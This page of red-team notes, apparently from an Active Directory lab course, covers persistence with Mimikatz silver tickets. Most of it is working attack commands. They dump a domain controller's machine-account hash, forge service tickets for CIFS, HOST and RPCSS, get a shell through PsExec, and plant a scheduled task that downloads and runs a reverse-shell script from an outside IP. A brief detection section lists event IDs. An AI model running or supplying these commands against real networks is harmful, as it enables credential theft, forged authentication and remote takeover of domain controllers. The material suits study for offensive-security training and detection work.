---
title: "Silver Tickets"
description: "Persistence using Silver Tickets."
lead: "Using Golden Tickets for persistence in Active Directory with Mimikatz."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_persistence"
weight: 20
toc: true
---

## General

- A valid TGS
- Encrypted and signed by NTLM hash of the target service account
- Services rarely check PAC (Privileged Attribute Certificate)
- Services will allow access only to the services themselves
- Reasonable persistence period (detauled 30 days for computer accounts)

## Exploitation

### Arguments

| Argument | Description |
| --- | --- |
| kerberos::golden | Name of the module (there is no Silver module!) |
| /domain:domain:dollarcorp.moneycorp.local | Domain FQDN |
| /sid:S-1-5-21-1874506631-3219952063-538504511 | SID of the domain |
| /target:dcorp dc.dollarcorp.moneycorp.local | Target server FQDN |
| /User:Administrator | Username for which the TGT is generated |
| /id:500 /groups:512 | Optional User RID (default 500) and Group (default 513 512 520 518 519) |
| /service:cifs | The SPN name of the target service for the TGS |
| /rc4:6f5b5acaf7433b3282ac22e21e62ff22 | NTLM (RC4) hash of the service/machine account (<MACHINE-NAME$>). Use /aes128 and /aes256 for using AES keys. |
| /startoffset:0 | Optional when the ticket is available (default 0 right now) in minutes. Use negative for a ticket available from past and a larger number for future. |
| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |
| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |
| /ptt | Injects the ticket in current PowerShell process no need to save the ticket on disk |

### Commands

```powershell
# Check Kerberos ticket policy using PowerView
(Get-DomainPolicy -Domain lab.local)."Kerberos Policy"

# Execute mimikatz on DC as DA to get dcorp-dc$ (machine account) hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch /user:dcorp-dc$"' -ComputerName "dcorp-dc"

# Using hash of the DC computer account, below command provides access to shares on the DC
# Similar command can be used for any other service on a machine
# Example services: HOST, RPCSS, WSMAN
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:CIFS /rc4:d32ef7a25657da14a143e0185488a1a3 /ptt"'

# Use proper values from kerberos policy and AES keys to be stealthier
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:CIFS /rc4:d32ef7a25657da14a143e0185488a1a3 /aes128:AES128KEY /aes256:AES256KEY /ptt"'

# Get shell through PsExec
.\PsExec.exe -AcceptEULA \\dcorp-dc.dollarcorp.moneycorp.local cmd
```

## Getting Command Execution

### Scheduled Tasks through HOST Service

```powershell
# Create silver ticket for the HOST SPN which will allow us to schedule a task on the target
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:HOST /rc4:d32ef7a25657da14a143e0185488a1a3 /ptt"'

# Create scheduled task
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.72/Invoke-PowerShellTcp.ps1''')'"

# Run task on the target
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"

# Clean Up
schtasks /delete /tn "STCheck" /s dcorp-dc.dollarcorp.moneycorp.local /f
```

### WMI

```powershell
# Create two tickets - one for HOST service and another for RPCSS
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:HOST /rc4:d32ef7a25657da14a143e0185488a1a3 /ptt"'
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:RPCSS /rc4:d32ef7a25657da14a143e0185488a1a3 /ptt"'

# Run WMI commands on DC
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

## Detection

- Event IDs:
  - 4624: Account Logon
  - 4634: Account Logoff
  - 4672: Admin Logon

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *
```
